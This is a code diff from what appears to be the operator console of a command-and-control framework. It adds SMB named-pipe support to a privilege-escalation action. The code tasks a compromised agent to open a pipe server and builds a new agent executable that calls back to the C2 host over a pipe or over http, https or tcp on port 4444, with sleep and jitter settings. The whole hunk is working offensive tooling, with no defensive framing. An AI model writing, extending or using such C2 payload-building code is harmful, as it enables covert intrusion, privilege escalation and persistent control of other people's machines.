@@ -4106,22 +4106,59 @@ async function runCtxAction(act) {
             const outName = `agent_priv_${suffix}.exe`;
             const c2host  = c2IPs[0] || (() => { try { return new URL(BASE).hostname; } catch(_){return '127.0.0.1';} })();
             const transport = vals.transport || 'http';
-            const portMap   = {http:'8080', https:'443', tcp:'4444'};
-            const scheme    = transport === 'tcp' ? 'tcp' : transport;
-            const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
-            openConsoleFor(aid);
-            addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
-            const buildR = await api('POST', '/api/build', {
-              lang: preferredLang(transport, agnt?.language), format:'exe', transport, server_url: serverURL,
-              sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
-              output_name: outName,
-            });
-            if (!buildR?.ok) {
-              addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
-              return;
+            if (transport === 'smb') {
+              const pipeName = `priv_${suffix}`;
+              const isLocalPrivesc = (vals.method === 'runas');
+              const pipeUNC = isLocalPrivesc
+                ? `\\\\.\\pipe\\${pipeName}`
+                : `\\\\${host}\\pipe\\${pipeName}`;
+              const srvURL = `http://${c2host}:8080`;
+              addConsoleOutputForAgent(aid, `[privesc] Starting pipe server ${pipeName} on parent…`, '', null);
+              addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → pipe:${pipeUNC}`, '', null);
+              const [pipeR, buildR] = await Promise.all([
+                api('POST', `/api/agents/${aid}/task`, {type:'PIPE_START', args:pipeName}),
+                api('POST', '/api/build', {
+                  lang: preferredLang('smb', agnt?.language), format:'exe', transport:'smb',
+                  smb_pipe: pipeUNC, server_url: srvURL,
+                  sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
+                  parent_id: aid,
+                  output_name: outName,
+                }),
+              ]);
+              if (!pipeR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ PIPE_START failed: ${pipeR?.error||'error'}`,null);
+                return;
+              }
+              addConsoleOutputForAgent(aid, `[privesc] ✓ PIPE_START dispatched`, '', null);
+              if (!buildR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
+                return;
+              }
+              const parentSleepSec = agnt?.sleep_sec || 5;
+              const waitMs = Math.max(20000, (parentSleepSec + 15) * 1000);
+              addConsoleOutputForAgent(aid, `[privesc] Waiting ${Math.round(waitMs/1000)}s for pipe server (agent sleep=${parentSleepSec}s)…`, '', null);
+              await new Promise(r => setTimeout(r, waitMs));
+              payloadName = outName;
+              addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
+            } else {
+              const portMap   = {http:'8080', https:'443', tcp:'4444'};
+              const scheme    = transport === 'tcp' ? 'tcp' : transport;
+              const serverURL = `${scheme}://${c2host}:${portMap[transport]||'8080'}`;
+              openConsoleFor(aid);
+              addConsoleOutputForAgent(aid, `[privesc] Building ${outName} → ${serverURL}…`, '', null);
+              const buildR = await api('POST', '/api/build', {
+                lang: preferredLang(transport, agnt?.language), format:'exe', transport, server_url: serverURL,
+                sleep_sec: agnt?.sleep_sec||5, jitter_pct: agnt?.jitter_pct??10,
+                parent_id: aid,
+                output_name: outName,
+              });
+              if (!buildR?.ok) {
+                addConsoleOutputForAgent(aid,'',`[privesc] ✗ Build failed: ${buildR?.error||'error'}`,null);
+                return;
+              }
+              payloadName = outName;
+              addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
             }
-            payloadName = outName;
-            addConsoleOutputForAgent(aid, `[privesc] ✓ Payload ready: ${payloadName}`, '', null);
           } else {
             openConsoleFor(aid);
           }
